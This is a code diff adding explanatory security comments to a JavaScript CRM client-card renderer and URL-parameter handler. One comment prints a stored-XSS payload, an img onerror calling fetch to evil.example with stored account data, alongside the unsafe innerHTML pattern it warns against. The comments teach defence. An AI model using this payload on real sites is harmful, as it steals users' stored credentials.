@@ -47,11 +47,37 @@ let editingClientId = null;
 /**
  * Build one client card.
  *
- * Everything is created with createElement and filled with textContent, never
- * by assembling an HTML string. Client names and companies come from the API
- * and from what the user types, and textContent makes the browser treat them
- * as text to display rather than markup to run. A client called
- * <img src=x onerror=...> shows up as those literal characters.
+ * ======================================================================
+ * SECURITY DECISION 3 — createElement + textContent, never HTML strings
+ * Explained in full in SECURITY.md, section 3.
+ * ======================================================================
+ *
+ * This is the one defence in this app that is REAL security rather than a
+ * compromise forced by having no backend, so it is the one worth understanding
+ * properly.
+ *
+ * Client names, companies and notes are free text. Suppose someone saves a
+ * client called:
+ *
+ *     <img src=x onerror="fetch('https://evil.example/?d='+localStorage.crm_users)">
+ *
+ * If this function built its markup by pasting that into a string —
+ *
+ *     card.innerHTML = '<div>' + client.name + '</div>';      // NEVER
+ *
+ * — the browser would not see a name. It would see an <img> tag, fail to load
+ * "x", run the onerror handler, and post every stored account (including the
+ * readable passwords from decision 1) to someone else's server. And because
+ * the client list is SAVED, it would do that again on every future visit, and
+ * to anyone else who opened that record. That is stored XSS, and persistence
+ * is exactly what makes it the worst kind.
+ *
+ * textContent has no parsing step. It tells the browser "these are characters
+ * to display", so there is nothing to inject into: the payload above renders
+ * as those literal characters, visibly and harmlessly.
+ *
+ * There is no innerHTML anywhere in this project, and that is checked rather
+ * than assumed.
  */
 function createClientCard(client) {
   const card = document.createElement('article');
@@ -266,10 +292,23 @@ function createStateBlock(message, { error = false, extra = null, spinner = fals
  * storage. It also means the link is a real link: it can be bookmarked, opened
  * in a new tab, or pasted to a colleague.
  *
- * THE VALUE IS UNTRUSTED. Anyone can type anything after `client=`, so it is
- * never used to build markup or a selector — it is turned into a number and
- * matched against ids we already have. An id that does not exist simply does
- * nothing, which is the right outcome for a stale bookmark.
+ * ======================================================================
+ * SECURITY DECISION 6 — a URL parameter is untrusted input
+ * Explained in full in SECURITY.md, section 6.
+ * ======================================================================
+ *
+ * Anyone can type anything after `client=`, so this value deserves exactly the
+ * suspicion a form field gets. It is never used to build markup and never
+ * dropped into a selector: it is converted to a number and matched against ids
+ * the app already holds. An id that does not exist simply does nothing, which
+ * is also the right behaviour for an ordinary stale bookmark.
+ *
+ * Compare replaceCard() above, where an id IS interpolated into a selector.
+ * That is safe only because of the Number() wrapped around it, which can
+ * produce nothing but a numeric literal, NaN or Infinity — none of which can
+ * break out of an attribute selector. Without it, an id containing a quote
+ * could change which elements matched. Same shape as SQL injection, same fix:
+ * never build a query out of raw input.
  */
 function openClientFromUrl() {
   const wanted = new URLSearchParams(window.location.search).get('client');
